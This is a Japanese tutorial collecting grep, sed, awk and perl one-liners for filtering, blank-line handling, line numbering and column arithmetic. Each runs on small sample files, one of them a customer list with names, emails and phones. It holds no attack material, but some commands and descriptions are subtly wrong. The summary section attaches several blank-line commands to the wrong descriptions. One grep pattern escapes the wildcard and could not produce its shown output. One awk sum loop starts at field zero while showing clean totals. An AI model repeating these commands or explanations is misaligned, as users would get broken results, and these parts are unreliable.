79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>

{{% tips-list tips %}}
ヒント
: ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。
{{% /tips-list %}}


### 一致する行の前に特定の行数を印刷します
数値を含む '-B' オプションは、ファイル内で一致する文字列またはパターンの前に特定の行数を出力するために使用されます。
この例では、Customers.txtファイルに対して「grep」コマンドの '-B' オプションの使用法を示しています。


<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -B1 "Riya"
11  Md. Abir        abir@gmail.com      +8801813462458
23  <font color=red>Riya</font> Chakroborti    riya@gmail.com      +8801937864534
$
</pre>

{{% tips-list tips %}}
ヒント
: 文字列「Riya」はファイルの3行目にあります。2行目は、一致する行の前の行です。したがって、2行目と3行目は、一致する文字列を強調表示することによって出力に出力されています。
{{% /tips-list %}}



### 一致する行の前後の特定の行数を印刷します
数値を指定した '-C' オプションは、ファイル内で見つかった一致する文字列またはパターンの前後の特定の行数を出力するために使用されます。
この例では、 Customers.txtファイルの「grep」コマンドの '-C' オプションの使用法を示しています。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -C1 "Maliha"
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  <font color=red>Maliha</font> Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>

{{% tips-list tips %}}
ヒント
: ターミナルから前のコマンドを実行すると、次の出力が表示されます。5行目には、文字列 'Maliha'が含まれています。4行目は一致する行の前の行で、6行目は一致する行の次の行です。したがって、4行目、5行目、および6行目は、一致する文字列を強調表示することによって出力に出力されています。 
{{% /tips-list %}}



### ブラケットを使用して特定の数字を一致させる[]
特定の桁の範囲は、角かっこ[]を使用して、「grep」コマンドの正規表現パターンで定義できます。
この例では、Customers.txtファイルの「grep」コマンドを使用して特定の数字を検索する方法を示します。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$ cat Customers.txt | grep '[3-5]'
$
11  Md. Abir        abir@gmail.com      +880181<font color=red>34</font>62<font color=red>45</font>8
2<font color=red>3</font>  Riya Chakroborti    riya@gmail.com      +88019<font color=red>3</font>786<font color=red>4534</font>
<font color=red>45</font>  Minhaz Ali      ali@gmail.com       +8801190761212
<font color=red>5</font>6  Maliha Chowdhury    maliha@gmail.com        +8801820001980
$
</pre>


{{% tips-list tips %}}
ヒント
: [3-5] は、3,4,5 のいずれかを検索文字列とするという意味となります。
: 2,3,4,5,6 としたい場合は、 [2-6]となります。
{{% /tips-list %}}


### 3番目のブラケットを使用してパターンを特定の文字と一致させる[]
ファイルの特定の文字は、角かっこ[]を使用してさまざまな方法で一致させることができます。
角かっこを使用してファイルから特定の行を検索することにより、正規表現パターンで文字の範囲または特定の文字を使用できます。
この例では、文字範囲または特定の文字のパターンを使用して、Customers.txtファイル内の特定の文字を検索する方法を示します。


<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep 'Ma[lr]'
56  <font color=red>Mal</font>iha Chowdhury    maliha@gmail.com        +8801820001980
79  <font color=red>Mar</font>uf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>


{{% tips-list tips %}}
ヒント
: Ma から始まる単語を検索し、さらに続く文字列が '[lr]' すなわち、l または r である文字列を検索します。いわゆる「Mal」と「Mar」を検索するという意味になります。
{{% /tips-list %}}



### [：alnum：]クラスを使用してアルファベットと数字を一致させる
[:alnum:]クラスは、アルファベットと数字を照合するために正規表現パターンで使用されます。
パターン[A-z0-9]に相当します。


### [：alpha：]クラスを使用してアルファベット文字を照合する
[:alpha:]クラスは、アルファベット文字のみに一致する正規表現パターンで使用されます。
パターン[A-z]に相当します。

### [：digit：]クラスを使用して数字を照合する
[:digit:]クラスは、正規表現パターンで数字のみに一致するために使用されます。
パターン[0-9]と同等です。

### [：lower：]クラスを使用して小文字を照合する
[:lower:]クラスは、すべての小文字のみに一致するように正規表現パターンで使用されます。
パターン[a-z]と同等です。

### [：space：]クラスを使用してスペース文字を一致させる
[:space:]クラスは、スペース文字を含む行と一致させるために正規表現パターンで使用されます。

{{% tips-list tips %}}
ヒント
: tab文字、空白も含めて検索対象となります。
: $ grep "test(タブ文字)" /path/to/file
:と、入力したい場合は、ctrl-v を入力してからタブを打つと入力される。

: '[[:space:]]' では空白文字もタブ文字もマッチする。 
: これならメモなどからコピペできる。
$ grep "test[[:space:]]" /path/to/file

: また、
$ grep test$'\t' /path/to/file
であればタブだけがマッチする。
{{% /tips-list %}}


### 行頭からの検索
キャレット（\^）記号は、ファイル内の特定の文字または文字列で始まる行と一致するように正規表現で使用されます。
この記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep ^4
<font color=red>4</font>5  Minhaz Ali      ali@gmail.com       +8801190761212
$

</pre>

{{% tips-list tips %}}
ヒント
: ターミナルから前のコマンドを実行すると、次の出力が表示されます。出力によると、customers.txtファイルには「 4 」で始まる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。
{{% /tips-list %}}


### 行の終わりに一致する
ドル（\$）記号は、ファイル内の特定の文字または文字列と行末を一致させるために正規表現で使用されます。
この記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep 1212$
45  Minhaz Ali      ali@gmail.com       +8801190761212
$
</pre>

{{% tips-list tips %}}
ヒント
: customers.txtファイルには「1212」で終わる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。
{{% /tips-list %}}



### 連結との一致
正規表現パターンは、複数のパターンを連結することで作成できます。
ドット（\.）は、パターンを連結するために使用されます。
この例では、 Customers.txtファイルに対して「grep」コマンドと連結して使用する方法を示しています。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -e '[MR]\.\*[Kk]'
23  <font color=red>Riya Chak</font>roborti    riya@gmail.com      +8801937864534
79  <font color=red>Maruf Sark</font>ar        maruf@gmail.com     +8801670908966
$
</pre>

{{% tips-list tips %}}
ヒント
: customers.txtファイルには「R」と「M 」で始まり「 k 」で終わる2行が存在します。したがって、ファイルの3行目と6行目が出力に出力されています。
{{% /tips-list %}}






## awk のTIPS
### タブをフィールドセパレータとして設定
``` bash
awk -F $'\t' 
```
### タブ区切りとして出力 (フィールド区切りとしても)
``` bash
awk -v OFS='\t'
```

### 変数を渡す
``` bash
a=bbo;b=obb;
awk -v a="$a" -v b="$b" "$1==a && $10=b" filename
```


## sed のTIPS
### sed連結

次のようなかなり長いコマンドは、
``` bash
sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d
```


GNU sed を使用すると、次のように書くことができます。
``` bash
sed '/AAA/b;/BBB/b;/CCC/b;d'
sed '/AAA\|BBB\|CCC/b;d'
```

### sedの速度最適化
実行速度を上げる必要がある場合 (入力ファイルが大きい、プロセッサやハードディスクが遅いなどの理由で)、「s/…/…/」を指定する前に「find」式を指定すると、置換がより迅速に実行されます。

``` bash
sed 's/foo/bar/g' filename         # standard replace command
sed '/foo/ s/foo/bar/g' filename   # executes more quickly
sed '/foo/ s//bar/g' filename      # shorthand sed syntax
```


ファイルの最初の部分から行を出力するだけでよい行の選択または削除では、スクリプト内の「quit」コマンド (q) により、大きなファイルの処理時間が大幅に短縮されます。

``` bash
sed -n '45,50p' filename           # print line nos. 45-50 of a file
sed -n '51q;45,50p' filename       # same, but executes much faster
```



## 空白行や改行の扱い
### sed 行末を行末＋改行に置き換えます。
``` :blankText.txt
Hello,

world!
```

```
bash-3.2$ cat blankText.txt
Hello,

world!
bash-3.2$ cat blankText.txt | sed G
Hello,



world!

bash-3.2$
```

### awk 行末を行末＋改行に置き換えます。
``` :blankText.txt
Hello,

world!
```

```
bash-3.2$ cat blankText.txt
Hello,

world!
bash-3.2$ cat blankText.txt | awk '1;{print ""}'
Hello,



world!

bash-3.2$
```

### awk 行末を行末＋改行に置き換えます。
``` :blankText.txt
Hello,

world!
```

```
bash-3.2$ cat blankText.txt
Hello,

world!
bash-3.2$ cat blankText.txt | awk 'BEGIN{ORS="\n\n"};1'
Hello,



world!

bash-3.2$
```

### sed 行末を（行末＋改行）ｘ２に置き換えます
``` :spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
```

```
bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | sed 'G;G'
Hello,world!


Hello,world!


Hello,world!


Hello,world!


bash-3.2$
```


### awk 行末を（行末＋改行）ｘ２に置き換えます
``` :spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
```

```
bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | awk '1;{print "\n"}'
Hello,world!


Hello,world!


Hello,world!


Hello,world!


bash-3.2$
```


### sed １行おきに空白行を挿入します
``` :spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
```

```
bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | sed '/^$/d;G'
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$
```

### awk 列数を出力
``` bash
awk '{print NF}'
```


### awk １行おきに空白行を挿入します。
``` :spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
```

``` 
bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | awk 'NF{print $0 "\n"}'
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$
```

### sed 偶数行の空白行を削除します
``` :doubleSpace.txt
bash-3.2$ cat doubleSpace.txt
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$
```

```
bash-3.2$ cat doubleSpace.txt
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$ cat doubleSpace.txt | sed 'n;d'
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$
```


### sed パターンに一致するすべての行の上に空白行を挿入
``` :regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '/America/{x;p;x;}'
Hello,Japan!

Hello,America!
Hello,France!
Hello,China!
bash-3.2$
```


### sed パターンに一致するすべての行の下に空白行を挿入
``` :regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '/America/G'
Hello,Japan!
Hello,America!

Hello,France!
Hello,China!
bash-3.2$
```


### sed パターンに一致するすべての行の上下に空白行を挿入
``` :regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '/America/{x;p;x;G;}'
Hello,Japan!

Hello,America!

Hello,France!
Hello,China!
bash-3.2$
```

### sed ファイルの末尾に空白行を追記
``` :regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '$a \\'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!

bash-3.2$
```

### sed awk 空白行の操作
空行１行を空行２行に増やす
``` bash
sed G
awk '1;{print ""}'
awk 'BEGIN{ORS="\n\n"};1'
```

空行１行を空行３行に増やす
``` bash
sed '/^$/d;G'
awk 'NF{print $0 "\n"}'
```

空行２行を空行１行に減らす
``` bash
sed 'G;G'
awk '1;{print "\n"}'
```

パターンに一致するすべての行の上に空白行を挿入
``` bash
sed 'n;d'
```

正規表現に一致するすべての行の下に空白行を挿入
``` bash
sed '/regex/{x;p;x;}'
```

正規表現に一致するすべての行の上下に空白行を挿入
``` bash
sed '/regex/G'
```

末尾に改行を追加します:
``` bash
sed '/regex/{x;p;x;G;}'
sed '$a\'
```






## ファイルへの文字列の追加
### sed ファイルの末尾に文字列を追加
``` :regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '$a ENDLINE'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
ENDLINE
bash-3.2$
```


### sed ファイルの末尾に複数行の文字列を追加
``` :regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat regex01.txt | sed '$a ENDLINE'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
ENDLINE
bash-3.2$ cat regex01.txt | sed '$a ENDLINE\nLine1\nLine2'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
ENDLINE
Line1
Line2
bash-3.2$
```

### sed ファイルの先頭に文字列を追加 (例: "[")
``` bash
cat filename | sed -i '1s/^/[/'
```


### sed ファイルの末尾に文字列を追加 (例: "]")

``` bash
cat filename | sed '$s/$/]/'
```

### sed ページの最後に改行を追加

``` bash
cat filaname | sed '$a\'
```


### sed すべての行の先頭に文字列を追加します (例: 'bbo')

``` bash
cat filename | sed -e 's/^/bbo/'
```

### sed 各行の末尾に文字列を追加します (例: "}")

``` bash
cat filename | sed -e 's/$/\}\]/'
```

### sed ４番目の文字ごとに改行を追加します
(たとえば、4 番目の文字ごと)

``` bash
cat filename | sed 's/.\{4\}/&\n/g'
```

## 行番号の付与
### sed タブを使用して各行に左揃えで行番号を付与
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ sed = country.txt | sed 'N;s/\n/\t/'
1    Hello,Japan!
2    Hello,America!
3    Hello,France!
4    Hello,China!
bash-3.2$
```


### awk タブを使用して各行に左揃えで行番号を付与
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk '{print FNR "\t" $0}'
1    Hello,Japan!
2    Hello,America!
3    Hello,France!
4    Hello,China!
bash-3.2$
```


### awk タブを使用して各行の前に行番号を付けます。
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk '{print NR "\t" $0}'
1    Hello,Japan!
2    Hello,America!
3    Hello,France!
4    Hello,China!
bash-3.2$
```


### nl 行番号を付ける (左揃え、右揃えの番号)。
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | nl
     1    Hello,Japan!
     2    Hello,America!
     3    Hello,France!
     4    Hello,China!
bash-3.2$
```

### sed 行番号を付ける (左揃え、右揃えの番号)。
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ sed = country.txt | sed 'N; s/^/      /;s/ *\(.\{6,\}\)\n/\1  /'
     1  Hello,Japan!
     2  Hello,America!
     3  Hello,France!
     4  Hello,China!
bash-3.2$
```

### awk 行番号を付ける (左揃え、右揃えの番号)。
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk '{printf("%6d : %s\n",NR,$0)}'
     1 : Hello,Japan!
     2 : Hello,America!
     3 : Hello,France!
     4 : Hello,China!
bash-3.2$
```


### sed 行が空白でない場合にのみ行番号を付ける。

``` :country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
```

```
bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ sed '/./=' country02.txt | sed '/./N; s/\n/ /'
1 Hello,Japan!
2 Hello,America!

4 Hello,France!

6 Hello,China!
bash-3.2$
```


### awk 行が空白でない場合にのみ行番号を付ける。
``` :country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
```

```
bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ cat country02.txt | awk 'NF{ $0=++a " :" $0};1'
1 :Hello,Japan!
2 :Hello,America!

3 :Hello,France!

4 :Hello,China!
bash-3.2$
```


### awk 行が空白でない場合にのみ行番号を付ける。
``` :country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
```


```
bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ cat country02.txt | awk '{print (NF? ++a " :" :"") $0}'
1 :Hello,Japan!
2 :Hello,America!

3 :Hello,France!

4 :Hello,China!
bash-3.2$
```


### awk 空白行を詰めた（除去した）上で行番号を付与
```
bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ cat country02.txt | awk '{print (NF? ++a " :" :"") $0}' | grep -v ^$
1 :Hello,Japan!
2 :Hello,America!
3 :Hello,France!
4 :Hello,China!
bash-3.2$
```

### sed 特定の行番号に文字列を追加します (例: 1 行目と 3 行目に 'something' を追加)

``` bash
cat filename | sed -e '1isomething' -e '3isomething'
```

### awk 行番号と各行の文字数を出力する
``` bash
awk '{print NR,length($0);}'
```

### awk すべての行に番号/インデックスを付ける
``` bash
awk '{printf("%s\t%s\n",NR,$0)}'
```




## 行カウント
### wc 行のカウント
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | wc -l
       4
bash-3.2$
```


### sed 行のカウント
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | sed -n '$='
4
bash-3.2$
```


### awk 行のカウント
``` :country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
```

```
bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk 'END{print NR}'
4
bash-3.2$
```

## 行列計算
### awk 行（A列とB列）の合計を出力
``` :calc.txt
10  11
12  13
14  15
16  17
18  19
20  21
```

```
bash-3.2$ cat calc.txt
10  11
12  13
14  15
16  17
18  19
20  21
bash-3.2$ cat calc.txt | awk '{s=0;for(i=0;i<NF;i++) s=s+$i; print s}'
21
25
29
33
37
41
bash-3.2$
```

### awk 行（A列とB列とC列）の合計を出力
``` :calc02.txt
10  11	1
12  13	1
14  15	1
16  17	1
18  19	1
20  21	1
```

参考：NF（フィールド数）
```
bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
```

参考：NR（行番号）
```
bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
```


### awk 各フィールドの合計を出力
``` :calc02.txt
10  11	1
12  13	1
14  15	1
16  17	1
18  19	1
20  21	1
```

```
bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{s=0;for(i=1;i<NF;i++)s=s+$i;print s}'
21
25
29
33
37
41
bash-3.2$
```


### awk 各フィールドの値が０より小さい場合に特定の文字列にに置き換える
``` :calc03.txt
10  11  1
12  13  1
14  -15 1
16  17  1
18  19  1
20  21  1
```

```
bash-3.2$ cat calc03.txt
10  11  1
12  13  1
14  -15 1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc03.txt | awk '{for(i=0;i<NF;i++)if($i<0)$i="Nega"; print }'
10  11  1
12  13  1
14 Nega 1
16  17  1
18  19  1
20  21  1
bash-3.2$
```



### awk 各行のフィールド数を出力、その後に次の行を出力
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
sh-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{print NF " : " $0}'
3 : 10  11  1
3 : 12  13  1
2 : 14  15
3 : 16  17  1
2 : 18  19
3 : 20  21  1
bash-3.2$
```


### awk 各行の最後のフィールドを出力
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{print $NF " : " $0}'
1 : 10  11  1
1 : 12  13  1
15 : 14  15
1 : 16  17  1
19 : 18  19
1 : 20  21  1
bash-3.2$
```


### awk 最初のフィールドを除くすべてを出力
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{$1="";print substr($0,2)}'
11 1
13 1
15
17 1
19
21 1
bash-3.2$
```



### awk 最後の行の最後のフィールドを出力
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{field=$NF}END{print field}'
1
bash-3.2$
```


### awk ３つ以上のフィールドを含むすべての行を出力
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk 'NF>2'
10  11  1
12  13  1
16  17  1
20  21  1
bash-3.2$
```


### awk 最後のフィールドの値が >2 であるすべての行を出力
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '$NF>1'
14  15
18  19
bash-3.2$
```


### perl 各行の最初の列の値と最後の列の値の合計を出力します。
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | perl -lane 'print $F[0]+$F[-1]'
11
13
29
17
37
21
bash-3.2$
```

### perl フィールドのすべての数値を 1 増やします。
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | perl -pe 's/(\d+)/1+$1/ge'
11  12  2
13  14  2
15  16
17  18  2
19  20
21  22  2
bash-3.2$
```


### perl すべてのフィールドの値を合計します。
``` :calc04.txt
10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
```

```
bash-3.2$ cat calc04.txt | perl -pe 's/(\d+)/1+$1/ge'
11  12  2
13  14  2
15  16
17  18  2
19  20
21  22  2
bash-3.2$ cat calc04.txt | awk '{sum+=$1}END{print sum}'
90
bash-3.2$
```


### awk ファイルのすべての番号を四捨五入 
(例: 有効数字 2 桁)
``` bash
awk '{while (match($0,/[0-9]+\[0-9]+/)){printf "%s%.2f",substr($0,0,RSTART-1),substr($0,RSTART,RLENGTH)$0=substr($0, RSTART+RLENGTH)}print}'
```

### awk ファイルの平均 
(ファイルの各行には 1 つの数値のみが含まれます)
``` bash
awk '{s+=$1}END{print s/NR}'
```

### awk 行を並べ替える 
(例: 1 40 35 12 23 > 1 12 23 35 40)
``` bash
awk ' {split( $0, a, "\t" ); asort( a ); for( i = 1; i <= length(a); i++ ) printf( "%s\t", a[i] ); printf( "\n" ); }'
```

### awk 前の行の値を減算します 
(column4 から最後の column5 を引いた値に等しい column6 を追加します)
``` bash
awk '{$6 = $4 - prev5; prev5 = $5; print;}'
```




## 単語や文字列のカウント
### awk すべての行のフィールド (「単語」) の総数を出力

``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.  
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$ cat doc01.txt | awk '{total=total+NF};END{print total}'
14
bash-3.2$
```


### awk 特定の単語を含むフィールドの（「単語」）の総数を出力
``` :doc02.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat doc02.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | awk '/Domain/ {total=total+NF};END{print total}'
11
bash-3.2$
```



### awk 特定の文字列を含む行数をカウント
``` :doc03.txt
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper

<thegrendel.abs@gmail.com>

10
10 Mar 2014

Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc
'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX® wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.

This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$
cat doc03.txt | awk '/examples/{n++}END{print n}'
1
bash-3.2$
```


### awk 最大文字列長を含む行を出力
(フィールド 1 で最も長い文字列を見つけることを目的としています)。
``` :doc03.txt
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper

<thegrendel.abs@gmail.com>

10
10 Mar 2014

Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc
'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX® wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.

This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
```

```
ash-3.2$ cat doc03.txt | awk '$1>max{max=$1;maxline=$0}END{print max,maxline}'
